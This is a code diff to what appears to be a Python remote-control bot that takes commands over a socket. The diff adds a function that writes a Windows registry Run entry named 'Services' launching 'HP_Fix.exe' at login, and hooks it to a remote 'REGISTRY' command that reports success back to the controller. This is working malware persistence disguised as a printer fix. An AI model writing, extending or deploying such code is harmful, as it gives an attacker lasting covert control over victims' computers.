@@ -9,6 +9,7 @@ from time import sleep
 import pyautogui
 from json import load
 from urllib import request
+import winreg
 
 #Useless func
 def create_botserver():
@@ -29,6 +30,23 @@ def create_botserver():
             continue
         else:
             pass
+
+def start_regitry_edit():
+    try:
+        name_file = "HP_Fix.exe"
+        pwd = str(os.getcwd())
+        path = "Software\Microsoft\Windows\CurrentVersion\Run"
+        name = "Services"
+        value = pwd + "\\" + name_file
+        winreg.CreateKey(winreg.HKEY_CURRENT_USER,path)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,path,0,winreg.KEY_WRITE)
+        winreg.SetValueEx(key,name,0,winreg.REG_SZ, value)
+        winreg.CloseKey(key)
+        return True
+    except PermissionError:
+        return False
+    except Exception as ee:
+        print("Error : %s"%(str(ee)))
 
 def start_session(s):
     while True:
@@ -52,8 +70,10 @@ def start_session(s):
 
             if "REGISTRY" in cmd:
                 try:
-
-                    pass #BETA
+                    if(start_regitry_edit()):
+                        s.send("SUCCESS".encode())
+                    else:
+                        s.send("FAILED".encode())
                 except:
                     s.send("FAILED".encode())
 
